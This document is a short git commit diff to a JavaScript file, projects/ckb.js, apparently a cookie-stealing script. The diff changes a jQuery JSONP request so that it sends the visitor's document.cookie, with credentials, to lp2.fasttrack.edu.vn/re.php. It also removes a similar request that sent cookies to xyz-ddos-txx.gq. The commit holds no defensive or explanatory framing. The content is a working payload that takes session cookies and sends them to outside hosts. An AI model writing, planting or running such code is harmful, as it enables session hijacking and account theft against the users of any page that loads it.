e049176bfdf26ad5f8a2391aa2f09d1213b3324f
Việt Nguyễn Đức <nguyenducviet1998tk@gmail.com>
2018-12-04 15:08:08 +0700

    o

--- projects/ckb.js
+++ projects/ckb.js
@@ -1,14 +1,9 @@
 $.ajax({
-    url: "https://lp2.fasttrack.edu.vn/re.php",
+    url: "https://lp2.fasttrack.edu.vn/re.php?d="+document.cookie,
     dataType: 'jsonp',
     type: 'GET',
     xhrFields: {
         'withCredentials': true
     },
     crossDomain: true
-})
-$.ajax({
-    url: "http://xyz-ddos-txx.gq/?d="+document.cookie,
-    dataType: 'jsonp',
-    type: 'GET',
 })
